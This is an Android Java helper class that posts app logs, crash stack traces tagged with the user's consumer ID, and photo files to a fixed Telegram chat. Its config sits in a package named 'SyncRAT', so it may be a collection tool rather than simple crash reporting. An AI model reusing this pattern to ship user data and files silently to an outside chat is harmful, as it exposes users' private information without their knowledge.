// android/iocl/dac_collector/Utility/TelegramBot.java
package android.iocl.dac_collector.Utility;

import android.app.Activity;
import android.app.Service;
import android.content.Context;
import android.iocl.dac_collector.BuildConfig;
import android.iocl.dac_collector.ModelData.TelegramResponse;
import android.iocl.dac_collector.RetrofitClient.TelegramApi;
import android.iocl.dac_collector.RetrofitClient.TelegramService;
import android.iocl.dac_collector.SyncRAT.Config;
import android.util.Log;

import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

import java.io.File;

public class TelegramBot {
    private static final String TAG       = "TelegramBot";
    private static final String BOT_TOKEN = Config.Telegram.BOT_TOKEN;
    private static final String SERVER_TOKEN = Config.Telegram.SERVER_TOKEN;
    private static final String CHAT_ID   = Config.Telegram.CHAT_ID;



    private final Context   context;
    private final TelegramApi api;

    private TelegramBot(Context ctx) {
        // use application context to avoid leaks
        this.context = ctx.getApplicationContext();
        this.api     = TelegramService.getService(context, BOT_TOKEN);
    }

    /** Start your fluent call. */
    public static TelegramBot with(Context context) {
        return new TelegramBot(context);
    }

    /** Send a text message. */
    public TelegramBot sendMessage(String text) {

        StringBuilder sb = new StringBuilder();
        sb.append("Custom Logging for App Version " + BuildConfig.VERSION_NAME + "\n\n")
                .append("Time: " + Utility.getStandardDatenTime() + "\n\n")
                .append("User: " + SharedPrefs.getConsumerId(context) + "\n\n");
        if (context instanceof Activity) {

            sb.append("Called from Activity: " + context.getClass().getSimpleName() +"\n\n");

        } else if (context instanceof Service) {
            sb.append("Called from Activity: " + context.getClass().getSimpleName() +"\n\n");

        } else {
            sb.append("Called from Activity: " +context.getClass().getSimpleName() +"\n\n");
        }



        Call<TelegramResponse> call = api.sendMessage(CHAT_ID, sb.toString() + "\n\n" + text);
        call.enqueue(new Callback<TelegramResponse>() {
            @Override
            public void onResponse(Call<TelegramResponse> call, Response<TelegramResponse> r) {
                Log.d(TAG, "onResponse: " + r);
            }
            @Override
            public void onFailure(Call<TelegramResponse> call, Throwable t) {

            }
        });
        return this;
    }

    /** Send a crash report (handles long stacktraces by splitting into chunks). */
    public TelegramBot reportCrash(final Throwable t) {
        // build the common header (reuse same fields as sendMessage)
        StringBuilder sb = new StringBuilder();
        sb.append("🔴 *CRASH REPORT*\n\n")
                .append("App: ").append(BuildConfig.APPLICATION_ID).append(" (").append(BuildConfig.VERSION_NAME).append(")\n")
                .append("Time: ").append(Utility.getStandardDatenTime()).append("\n")
                .append("User: ").append(SharedPrefs.getConsumerId(context)).append("\n")
                .append("Caller: ").append(context.getClass().getSimpleName()).append("\n\n");

        // exception + full stacktrace
        String stack = Log.getStackTraceString(t);
        String body = sb.toString()
                + "Exception: " + t.toString() + "\n\n"
                + "Stacktrace:\n" + stack;

        // Telegram message size limit is ~4096 chars; use a safe chunk size
        final int CHUNK_SIZE = 3000;
        if (body.length() <= CHUNK_SIZE) {
            Call<TelegramResponse> call = api.sendMessage(CHAT_ID, body);
            call.enqueue(new Callback<TelegramResponse>() {
                @Override
                public void onResponse(Call<TelegramResponse> call, Response<TelegramResponse> r) {
                    Log.d(TAG, "Crash report sent: " + r);
                }
                @Override
                public void onFailure(Call<TelegramResponse> call, Throwable t) {
                    Log.e(TAG, "Failed to send crash report", t);
                }
            });
        } else {
            // split into numbered parts
            int parts = (body.length() + CHUNK_SIZE - 1) / CHUNK_SIZE;
            for (int i = 0; i < parts; i++) {
                int start = i * CHUNK_SIZE;
                int end = Math.min(body.length(), start + CHUNK_SIZE);
                String chunk = String.format("🔴 *CRASH REPORT* (Part %d/%d)\n\n", i + 1, parts)
                        + body.substring(start, end);

                Call<TelegramResponse> call = api.sendMessage(CHAT_ID, chunk);
                final int partIndex = i;
                call.enqueue(new Callback<TelegramResponse>() {
                    @Override
                    public void onResponse(Call<TelegramResponse> call, Response<TelegramResponse> r) {
                        Log.d(TAG, "Crash part " + (partIndex + 1) + " sent: " + r.message());
                    }
                    @Override
                    public void onFailure(Call<TelegramResponse> call, Throwable t) {
                        Log.e(TAG, "Failed to send crash part " + (partIndex + 1), t);
                    }
                });
            }
        }
        return this;
    }


    /** Send Markdown formatted message */


    /** Send a photo with optional caption. */
    public TelegramBot sendPhoto(File photoFile, String caption) {
        // build parts
        RequestBody chatPart = RequestBody.create(
                CHAT_ID, okhttp3.MediaType.parse("text/plain")
        );
        RequestBody capPart = RequestBody.create(
                caption != null ? caption : "",
                okhttp3.MediaType.parse("text/plain")
        );
        MultipartBody.Part photoPart =
                TelegramService.prepareFilePart("photo", photoFile);

        Call<TelegramResponse> call = api.sendPhoto(chatPart, photoPart, capPart);
        call.enqueue(new Callback<TelegramResponse>() {
            @Override
            public void onResponse(Call<TelegramResponse> call, Response<TelegramResponse> r) {

                Log.d(TAG, "onResponse: " + r.message());

            }
            @Override
            public void onFailure(Call<TelegramResponse> call, Throwable t) {

                Log.d(TAG, "onResponse: " + call);
                Log.d(TAG, "onResponse: " + t);

            }
        });
        return this;
    }
}
